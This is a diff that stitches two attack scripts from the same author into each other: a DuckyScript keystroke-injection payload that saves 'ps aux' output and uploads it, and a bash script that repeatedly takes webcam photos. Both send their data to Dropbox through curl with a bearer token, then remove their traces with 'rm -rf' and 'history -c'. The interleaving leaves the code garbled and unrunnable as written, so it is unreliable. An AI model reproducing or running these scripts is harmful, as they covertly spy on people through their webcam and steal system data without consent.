@@ -1,4 +1,5 @@
-
+#!/bin/bash
+USER=$(whoami)
 REM ##########################################
 REM #                                        |
 REM # Title        : Exfiltrate Process Info |
@@ -6,29 +7,45 @@ REM # Author       : Aleff                   |
 REM # Version      : 1.0                     |
 REM # Category     : Exfiltration            |
 REM # Target       : Linux                   |
-REM #                                        |
+REM # DIR=/home/$USER/tmp                                       |
 REM ##########################################
-
+TOKEN=your_dropbox_token
 REM Requirements:
 REM     - Internet Connection
 REM     - Discord Webhook
-
+mkdir -p $DIR
 DELAY 1000
 CTRL-ALT t
 DELAY 2000
-
-
+function remove_folder {
+  rm -rf "$DIR"
+  rm -rf "/home/$USER/script.sh"
+}
+trap remove_folder EXIT
+# execute the for, for some times..
+for i in {1..10}
+do
+  NAME=$(date +%s%N).jpg
+  fswebcam --no-banner $DIR/$NAME
+curl -X POST https://content.dropboxapi.com/2/files/upload \
+    --header "Authorization: Bearer $TOKEN" \
+    --header "Dropbox-API-Arg: {\"path\": \"/$NAME\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" \
+    --header "Content-Type: application/octet-stream" \
+    --data-binary @$DIR/$NAME
+sleep 60
 REM #### GET PROCESS SECTION ####
-
-
+done
+REM ##################################################
 STRING ps aux > process.txt
 ENTER
 DELAY 500
-
-
+REM #                                                |
+REM # Title        : Exfiltrate Photos Through Shell |
 REM #### EXFILTRATE SECTION ####
-
-
+REM # Title        : Exfiltrate Photos Through Shell |
+REM # Author       : Aleff                           |
+REM # Version      : 1.0                             |
+REM # Category     : Exfiltration                    |                             |
 REM Required: Set here your Dropbox access TOKEN
 DEFINE TOKEN example
 STRING ACCESS_TOKEN="
@@ -36,15 +53,15 @@ STRING TOKEN
 STRING "
 ENTER
 DELAY 500
-
+REM # Target       : Linux 
 STRING USER_NAME=$(whoami)
 ENTER
 DELAY 500
-
+REM #
 STRING TXT_PATH="/home/$USER_NAME/process.txt"
 ENTER
 DELAY 500
-
+REM ##################################################
 REM Set yout Dropbox folder name
 DEFINE DROPBOX_FOLDER_NAME example
 STRING DROPBOX_FOLDER="/
@@ -52,20 +69,20 @@ STRING DROPBOX_FOLDER_NAME
 STRING "
 ENTER
 DELAY 500
-
+REM Requirements:
 DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
 STRING curl -X POST
 STRING DROPBOX_API_CONST
 STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$TXT_PATH"
 ENTER
-
+REM     - Internet Connection
 REM It depends by the internet connection, btw 1 or 2 seconds, generally, is sufficient
 DELAY 2000
-
-
+REM     - Dropbox Token for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Discord, Telegram and so on..)
+REM     - sudo permissions
 REM #### REMOVE TRACES ####
-
-
+REM         - if you need to install 'fswebcam'
+REM         - for add the -x permission to the script.sh downloaded
 STRING history -c
 ENTER
 DELAY 500
